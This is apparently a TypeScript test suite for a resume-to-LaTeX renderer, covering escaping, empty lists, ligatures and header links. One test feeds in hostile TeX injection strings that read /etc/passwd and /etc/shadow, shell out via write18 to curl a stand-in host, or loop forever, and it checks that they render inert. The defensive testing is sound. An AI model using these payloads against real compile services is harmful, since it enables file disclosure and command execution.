import assert from 'node:assert';
import { escapeLatex, linkText, renderResumeLatex } from './latexEngine';
import { ResumeStructure } from './types';

// Fixture packed with LaTeX specials: R&D, 100%, C++, a_b, and a raw backslash.
const fixture: ResumeStructure = {
  name: 'Jane R&D Doe',
  contact: {
    phone: '123-456-7890',
    email: 'jane@example.com',
    linkedin: 'https://linkedin.com/in/jane',
    github: 'https://github.com/jane',
  },
  summary: 'Did 100% of the C++ work in a_b\\c pipeline.',
  education: [
    { school: 'MIT', location: 'Cambridge, MA', degree: 'BS in R&D', dates: '2018 -- 2022' },
  ],
  experience: [
    {
      title: 'Engineer',
      dates: 'Jan 2022 -- Present',
      org: 'Acme & Co',
      location: 'Remote',
      bullets: ['Shipped C++ at 100% uptime', 'Reduced a_b latency by 50%'],
    },
  ],
  projects: [
    {
      name: 'Proj_X',
      tech: 'C++ & Rust',
      dates: '2023',
      bullets: ['Built a\\b parser'],
    },
  ],
  skills: [{ category: 'Languages', items: 'C++, Python, R&D tooling' }],
};

function run() {
  // (a) escaping: backslash, &, %, _
  const out = renderResumeLatex(fixture);
  assert.ok(out.includes('\\textbackslash'), 'expected \\textbackslash for raw backslash');
  assert.ok(out.includes('R\\&D'), 'expected escaped \\& (R&D)');
  assert.ok(out.includes('100\\%'), 'expected escaped \\% (100%)');
  assert.ok(out.includes('a\\_b') || out.includes('Proj\\_X'), 'expected escaped \\_ (underscore)');

  // escapeLatex unit-level ordering: raw backslash must not double-escape.
  assert.strictEqual(escapeLatex('a\\b'), 'a\\textbackslash{}b', 'backslash escape');
  assert.strictEqual(escapeLatex('R&D 100% a_b'), 'R\\&D 100\\% a\\_b', 'combined escape');
  assert.strictEqual(escapeLatex(''), '', 'empty string');
  assert.strictEqual(escapeLatex(undefined as unknown as string), '', 'undefined -> empty');
  assert.strictEqual(escapeLatex('~^'), '\\textasciitilde{}\\textasciicircum{}', 'tilde/caret');

  // (b) expected macro calls present
  assert.ok(out.includes('\\resumeSubheading{'), 'expected \\resumeSubheading');
  assert.ok(out.includes('\\resumeItem{'), 'expected \\resumeItem');
  assert.ok(out.includes('\\resumeProjectHeading{'), 'expected \\resumeProjectHeading');

  // (c) document delimiters
  assert.ok(out.includes('\\begin{document}'), 'expected \\begin{document}');
  assert.ok(out.includes('\\end{document}'), 'expected \\end{document}');

  // (d) optional sections appear only when provided
  assert.ok(out.includes('\\section{Summary}'), 'Summary present when provided');
  assert.ok(!out.includes('\\section{Certifications}'), 'Certifications absent when omitted');
  assert.ok(!out.includes('\\section{Awards}'), 'Awards absent when omitted');

  const withOptional = renderResumeLatex({
    ...fixture,
    summary: undefined,
    certifications: ['AWS Certified'],
    awards: ['Best Engineer 2024'],
  });
  assert.ok(!withOptional.includes('\\section{Summary}'), 'Summary absent when undefined');
  assert.ok(withOptional.includes('\\section{Certifications}'), 'Certifications present when provided');
  assert.ok(withOptional.includes('\\section{Awards}'), 'Awards present when provided');
  assert.ok(withOptional.includes('\\resumeItem{AWS Certified}'), 'cert rendered via \\resumeItem');

  // Empty optional arrays must NOT render the section.
  const emptyOptional = renderResumeLatex({ ...fixture, certifications: [], awards: [] });
  assert.ok(!emptyOptional.includes('\\section{Certifications}'), 'empty certs -> no section');

  // (e) TeX commands in user text stay inert.
  //
  // /api/compile no longer accepts LaTeX from anyone — it renders from a stored
  // structure — so these strings can only arrive as someone's job title or
  // bullet. They must land as printable characters, never as commands: \input
  // reads a server file into the PDF, \write18 shells out, and a self-calling
  // macro runs until the compile times out.
  const hostile = renderResumeLatex({
    ...fixture,
    name: '\\input{/etc/passwd}',
    summary: '\\immediate\\write18{curl evil.example}',
    experience: [
      {
        title: '\\def\\x{\\x}\\x',
        dates: '2024',
        org: '\\catcode`\\@=11',
        location: '\\href{javascript:alert(1)}{click}',
        bullets: ['\\input{/etc/shadow}'],
      },
    ],
  });
  // Comments are stripped first: TeX ignores everything after an unescaped %,
  // and the preamble carries a comment mentioning \input that would otherwise
  // look like a hit.
  const live = hostile.replace(/(^|[^\\])%.*$/gm, '$1');
  for (const command of ['\\input{', '\\write18', '\\def\\x', '\\catcode', '\\href{javascript:']) {
    assert.ok(
      !live.includes(command),
      `user text produced a live TeX command: ${command}`,
    );
  }
  // It is still printed, just as text — the backslash became \textbackslash and
  // the braces were escaped, so nothing is silently dropped from the resume.
  assert.ok(hostile.includes('\\textbackslash'), 'hostile input should render as visible text');
  assert.ok(hostile.includes('\\{'), 'braces in user text must be escaped');

  // (f) no empty itemize, ever.
  //
  // Both list macros open an itemize, and LaTeX aborts the whole compile on one
  // containing no \\item. Every case below was a real failure: a job whose
  // bullets had not been written yet, and an account with no projects, each
  // produced no PDF at all rather than a PDF without that part.
  const empties: [string, ResumeStructure][] = [
    ['a job with no bullets', { ...fixture, experience: [{ ...fixture.experience[0], bullets: [] }] }],
    ['a project with no bullets', { ...fixture, projects: [{ ...fixture.projects[0], bullets: [] }] }],
    ['bullets that are only whitespace', { ...fixture, experience: [{ ...fixture.experience[0], bullets: ['  ', ''] }] }],
    ['no education', { ...fixture, education: [] }],
    ['no experience', { ...fixture, experience: [] }],
    ['no projects', { ...fixture, projects: [] }],
    ['no skills', { ...fixture, skills: [] }],
    ['a new account with only a name', { ...fixture, summary: undefined, education: [], experience: [], projects: [], skills: [] }],
  ];

  for (const [label, structure] of empties) {
    const rendered = renderResumeLatex(structure);
    // Only the body: the preamble defines these macros with \newcommand, and a
    // definition sitting beside its matching end is not an empty list.
    const body = rendered.slice(rendered.indexOf('\\begin{document}'));
    // An itemize whose next non-blank line closes it has no \item in it.
    const lines = body.split('\n').map((l) => l.trim()).filter(Boolean);
    for (let i = 0; i < lines.length - 1; i += 1) {
      const opens = lines[i].includes('\\resumeItemListStart') || lines[i].includes('\\resumeSubHeadingListStart') || lines[i].startsWith('\\begin{itemize}');
      const closesNext = lines[i + 1].includes('ListEnd') || lines[i + 1].startsWith('\\end{itemize}');
      assert.ok(!(opens && closesNext), `${label}: emitted an empty itemize at line ${i + 1}`);
    }
  }

  // The section heading goes with it — "Projects" over nothing reads worse than
  // never mentioning projects.
  const noProjects = renderResumeLatex({ ...fixture, projects: [] });
  assert.ok(!noProjects.includes('\\section{Projects}'), 'no projects -> no Projects heading');
  const noSkills = renderResumeLatex({ ...fixture, skills: [] });
  assert.ok(!noSkills.includes('\\section{Technical Skills}'), 'no skills -> no Skills heading');

  // A project with no tech must not leave a dangling separator after its name.
  const noTech = renderResumeLatex({ ...fixture, projects: [{ ...fixture.projects[0], tech: '' }] });
  assert.ok(!noTech.includes('$|$ \\emph{}'), 'empty tech should drop the separator, not render it empty');

  // (g) an entry's heading stays with its first bullet.
  //
  // A real resume ended a page with "Founder & Digital Creator / Kudi Kitchen"
  // and started the next with its only bullet. beginpenalty forbids the break
  // inside the bullet list; \nopagebreak holds the heading row to what follows.
  // Both come from enumitem, which the preamble already loads — the compile
  // service has no network during a compile and could not fetch a new package.
  const withEntries = renderResumeLatex(fixture);
  assert.ok(
    withEntries.includes('\\begin{itemize}[beginpenalty=10000]'),
    'bullet lists must forbid a break before their first item',
  );
  for (const macro of ['\\resumeSubheading', '\\resumeProjectHeading']) {
    const definition = withEntries.slice(withEntries.indexOf(`\\newcommand{${macro}}`));
    assert.ok(
      definition.slice(0, definition.indexOf('\n}')).includes('\\nopagebreak'),
      `${macro} must hold its heading to the bullets under it`,
    );
  }

  /*
   * (i) The f-ligatures stay off.
   *
   * With them on, a compiled PDF's own ToUnicode table maps the "ffi" glyph to
   * U+FB00 followed by "i" — so "officer" extracts as "o" + the ff ligature +
   * "icer", and an employer's system searching for "Chief Financial Officer"
   * finds nothing. Also office, efficient, difficulty, staffing, traffic.
   *
   * Invisible on screen, because PDF readers normalise the ligature back to
   * "ff" before showing it. That is why it survived this long on a product
   * whose whole job is putting a posting's own words onto a resume — and why
   * it is asserted here rather than left to somebody noticing.
   */
  const preamble = renderResumeLatex(fixture);
  assert.ok(preamble.includes('\\usepackage{fontspec}'), 'fontspec is what makes the ligature switch reachable');
  assert.ok(
    /\\setmainfont\{lmroman10-regular\.otf\}/.test(preamble),
    'the main font must be named by file — \\setmainfont{Latin Modern Roman} does not resolve under tectonic',
  );
  assert.ok(
    /Ligatures\s*=\s*NoCommon/.test(preamble),
    'the f-ligatures must stay off, or "officer" stops matching "officer"',
  );

  // ── the header's links ───────────────────────────────────────────────────
  //
  // Spelled out, the two profile addresses took a whole line and most of its
  // width. These resumes are submitted online, where a link is clicked and
  // never retyped off a page, so the printed text went back to a label and
  // the address stayed where it is actually used: in the link underneath.
  const header = renderResumeLatex({
    ...fixture,
    contact: {
      phone: '905-922-5891',
      email: 'a@example.com',
      linkedin: 'linkedin.com/in/chukwudi-ndubuisi',
      github: 'github.com/chukwudican-sudo',
      website: 'https://www.meetalexius.com/',
    },
  });
  assert.match(header, /\{\\underline\{LinkedIn\}\}/);
  assert.match(header, /\{\\underline\{GitHub\}\}/);
  // The website is the exception, because its label would be its host: there
  // is nothing to shorten, so it stays spelled out.
  assert.match(header, /\{\\underline\{meetalexius\.com\}\}/);

  // Short text, whole address. The label is what prints; the href is what a
  // click follows, and without a scheme it is relative and dead.
  assert.match(header, /\\href\{https:\/\/linkedin\.com\/in\/chukwudi-ndubuisi\}/);
  assert.match(header, /\\href\{https:\/\/github\.com\/chukwudican-sudo\}/);

  // The scheme, the www and a trailing slash are noise on a printed page.
  assert.strictEqual(linkText('https://www.linkedin.com/in/someone/'), 'linkedin.com/in/someone');
  assert.strictEqual(linkText('http://meetalexius.com'), 'meetalexius.com');
  assert.strictEqual(linkText('github.com/x'), 'github.com/x');

  /*
   * Each address unbreakable, every separator still a breakpoint.
   *
   * A URL is full of hyphens and slashes and LaTeX will break a line at any
   * of them: "meetalexius." ending a line is the failure this prevents. The
   * separators stay breakable, so a header too long for the page wraps
   * between items rather than inside one.
   */
  const contactLine = header.split('\n').find((l) => l.includes('linkedin.com'))!;
  assert.strictEqual(
    (contactLine.match(/\\mbox\{/g) ?? []).length,
    4,
    'the email and all three links are boxed',
  );
  assert.match(contactLine, /\} \$\|\$ \\mbox/, 'and the separator between them stays a breakpoint');

  /*
   * One line, in reading order. Compiled, this is:
   *
   *   905-922-5891 | chukwudi.can@gmail.com | meetalexius.com | LinkedIn | GitHub
   *
   * It was two — reach above, profiles below — which was right while the
   * profiles printed as full addresses. Labelled, a forced break only buys a
   * second line of white space at the top of a page that is short of room.
   */
  assert.ok(!contactLine.includes('\\\\'), 'the header is one line, not two');
  assert.strictEqual(
    (contactLine.match(/\$\|\$/g) ?? []).length,
    4,
    'five items, four separators',
  );
  assert.match(
    contactLine,
    /905-922-5891 \$\|\$ .*a@example\.com.*\$\|\$ .*meetalexius\.com.*\$\|\$ .*LinkedIn.*\$\|\$ .*GitHub/,
    'phone, email, site, then the two profiles',
  );

  // Nothing prints a separator it does not need.
  const sparse = renderResumeLatex({ ...fixture, contact: { phone: '905-922-5891' } });
  const onlyLine = sparse.split('\n').find((l) => l.includes('905-922-5891'))!;
  assert.ok(!onlyLine.includes('\\\\'), 'no forced break for somebody with nothing else');
  assert.ok(!onlyLine.includes('$|$'), 'and no stray separator');

  const noPhone = renderResumeLatex({ ...fixture, contact: { github: 'github.com/x' } });
  const githubOnly = noPhone.split('\n').find((l) => l.includes('github.com/x'))!;
  assert.ok(!githubOnly.includes('\\\\'), 'nor for somebody with only a profile');
  assert.ok(!githubOnly.includes('$|$'), 'nor a separator with nothing on the other side');

  // A project line is labelled for the same reason, and always was.
  assert.match(
    renderResumeLatex({
      ...fixture,
      projects: [{ name: 'FraudWatch', tech: 'Java', dates: 'Aug 2026', bullets: ['one'], url: 'github.com/x/fraudwatch' }],
    }),
    /\{\\underline\{GitHub\}\}/,
  );

  console.log('latexEngine.test.ts: all assertions passed');
}

run();

